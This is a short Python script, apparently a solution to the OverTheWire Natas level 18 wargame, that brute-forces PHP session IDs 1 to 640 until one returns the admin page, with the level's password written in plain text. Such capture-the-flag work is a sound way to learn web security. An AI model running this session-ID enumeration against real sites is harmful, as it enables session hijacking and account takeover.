import requests
import re
from string import *
import time
import sys

characters = "abcdefghijkjmnopqrstuvwyxzABCDEFGHIJKLMNOPQRSTUVWYXZ0123456789"


logar = ["natas18","xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP"]
url = "http://%s.natas.labs.overthewire.org/"%logar[0]
session = requests.Session()

for session_id in range(1,641):
    r = session.post(url, cookies={"PHPSESSID": str(session_id) }, data={'username':'aloha', 'password': 'aloha'}, auth=(logar[0],logar[1]), timeout=10)
    contento = r.text
    if "regular user" not in contento:
        print("ADMIN")
        print(contento)
        sys.exit()
    else:
        print("Tentando => "+str(session_id))
